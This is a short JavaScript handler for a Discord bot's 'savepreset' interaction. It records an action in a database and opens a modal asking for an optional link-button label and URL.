const { queryParams } = require("../../../db/database");
const generate = require("../../../autosecure/utils/generate");
const modalBuilder = require("../../../autosecure/utils/modalBuilder");
const { TextInputStyle } = require("discord.js");

module.exports = {
  name: "savepreset",
  editpresets: true,
  callback: async (client, interaction) => {
    let [t, name, ownerid, botnumber, number] = interaction.customId.split("|");
    let actionId = generate(32);

    await queryParams(
      `INSERT INTO actions (id, action) VALUES (?, ?)`,
      [actionId, `savepresetmodal|${name}|${ownerid}|${botnumber}|${number}`]
    );

    let customModalId = `action|${actionId}`;

    await interaction.showModal(
      modalBuilder(customModalId, `Save Preset [Leave empty for normal]`, [
        {
          setCustomId: "linklabel",
          setRequired: false,
          setLabel: "Link Button Label",
          setPlaceholder: "[Optional] The label of the links button.",
          setStyle: TextInputStyle.Short
        },
        {
          setCustomId: "linkurl",
          setRequired: false,
          setLabel: "Link URL",
          setPlaceholder: "[Optional] A button on the embed with a link.",
          setStyle: TextInputStyle.Short
        }
      ])
    );
  }
};
